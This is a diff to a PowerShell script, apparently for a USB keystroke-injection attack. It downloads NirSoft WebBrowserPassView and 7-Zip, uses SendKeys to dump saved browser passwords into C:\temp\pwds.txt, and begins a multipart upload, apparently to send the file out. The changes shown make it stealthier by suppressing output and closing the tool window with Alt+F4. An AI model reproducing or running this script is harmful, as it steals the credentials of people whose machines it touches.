@@ -3,7 +3,7 @@ $fileName = "pwds.txt"
 $filePath = "C:\temp\" + $fileName
 $wshell = New-Object -ComObject wscript.shell;
 
-mkdir \temp
+mkdir \temp | Out-Null
 cd \temp
 iwr -Headers @{'Referer' = 'http://www.nirsoft.net/utils/web_browser_password.html'} -Uri http://www.nirsoft.net/toolsdownload/webbrowserpassview.zip -OutFile wbpv.zip | Out-Null
 iwr -uri https://www.7-zip.org/a/7za920.zip -OutFile 7z.zip | Out-Null
@@ -13,7 +13,7 @@ Expand-Archive 7z.zip | Out-Null
 
 Sleep 10
 
-$wshell.AppActivate('WebBrowserPassView')
+$wshell.AppActivate('WebBrowserPassView') | Out-Null
 Sleep 1
 $wshell.SendKeys("^{a}")
 Sleep 1
@@ -23,7 +23,7 @@ $wshell.SendKeys($fileName)
 Sleep 1
 $wshell.SendKeys("~")
 Sleep 2
-
+$wshell.SendKeys("%{F4}")
 $boundary = [System.Guid]::NewGuid().ToString()
 $headers = @{
     "Content-Type" = "multipart/form-data; boundary=$boundary"
